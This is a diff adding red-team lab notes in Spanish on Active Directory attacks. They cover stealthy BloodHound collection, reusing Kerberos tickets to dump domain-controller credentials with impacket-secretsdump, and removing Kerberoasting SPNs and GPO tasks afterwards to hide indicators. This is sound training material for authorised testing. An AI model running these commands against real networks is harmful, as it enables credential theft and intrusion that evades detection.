@@ -352,3 +352,82 @@ Reglas:
 ---
 
 *Última actualización: Mayo 2026 — Lab-01 (APT29) + Lab-02 inicio (APT41) — Adrián Camacho*
+---
+
+## 9. 🩸 BloodHound — Recolección OPSEC
+
+### bloodhound-python vs SharpHound
+
+**Regla:** Usar siempre bloodhound-python como primera pasada. Solo subir SharpHound cuando se necesita coverage completo de ACLs/GPOs y ya se tiene acceso privilegiado.
+
+```bash
+# Primera pasada — solo tráfico LDAP desde Kali
+bloodhound-python -u usuario -p password -d dominio -ns IP -c All --zip
+```
+
+| Criterio | bloodhound-python | SharpHound |
+|----------|-------------------|------------|
+| Binarios en objetivo | ❌ Ninguno | ✅ SharpHound.exe |
+| Detección | Solo tráfico LDAP voluminoso | Proceso + eventos + AV |
+| Coverage ACLs GPO | ⚠️ Parcial | ✅ Completo |
+| Cuándo usarlo | Primera pasada siempre | Segunda pasada si se necesita GPO/ADCS paths |
+
+---
+
+## 10. 🎫 Kerberos — Sesiones WinRM vs interactivas
+
+**Problema crítico:** Rubeus `ptt`, Potato attacks y cualquier manipulación de tokens Kerberos **falla en sesiones WinRM** porque WinRM usa Network Logon (Logon Type 3), que no permite modificar la caché de tickets.
+
+**Solución:** Usar impacket desde Kali en lugar de intentar manipular tickets desde la shell WinRM.
+
+```bash
+# En lugar de ptt desde WinRM:
+python3 -c "import base64; open('/tmp/ticket.ccache','wb').write(base64.b64decode(open('/tmp/ticket.b64').read()))"
+export KRB5CCNAME=/tmp/ticket.ccache
+impacket-secretsdump -k -no-pass DC-01.dominio.local
+```
+
+---
+
+## 11. 🔑 ACL Abuse — Limpieza post-explotación
+
+**Obligatorio:** Eliminar SPNs añadidos para Targeted Kerberoasting. Un SPN `fake/hostname` es un IOC obvio.
+
+```bash
+# Eliminar SPN después del ataque
+bloodyAD -u usuario -p password -d dominio --host IP   set object cuenta_objetivo servicePrincipalName -v "SPN_ORIGINAL"
+# O eliminar completamente:
+bloodyAD ... set object cuenta servicePrincipalName -v ""
+```
+
+---
+
+## 12. 🖥️ GPO Abuse — Restaurar configuración
+
+**Obligatorio en engagements reales:** Eliminar las tareas creadas en SYSVOL después del ataque.
+
+```powershell
+# Eliminar ScheduledTasks.xml de SYSVOL
+$gpoId = (Get-GPO -Name "GPO-NOMBRE").Id.ToString()
+Remove-Item "\DC\SYSVOL\dominio\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+```
+
+---
+
+## 13. 🌐 Kali — Configuración de red permanente
+
+**Problema recurrente:** La default route de eth0 (red lab) bloquea el acceso a Internet tras reinicios.
+
+**Solución permanente via NetworkManager:**
+```bash
+# eth0 — red lab, nunca default gateway
+sudo nmcli con modify "LabRedTeam" ipv4.never-default yes
+sudo nmcli con modify "LabRedTeam" +ipv4.routes "10.0.3.0/24 10.0.2.1"
+
+# eth2 — NAT Internet, default con métrica baja
+sudo nmcli con modify "Wired connection 1" ipv4.route-metric 50
+
+# Verificar
+sudo nmcli con up "LabRedTeam" && sudo nmcli con up "Wired connection 1"
+ping -c 1 10.0.2.10 && ping -c 1 8.8.8.8
+```
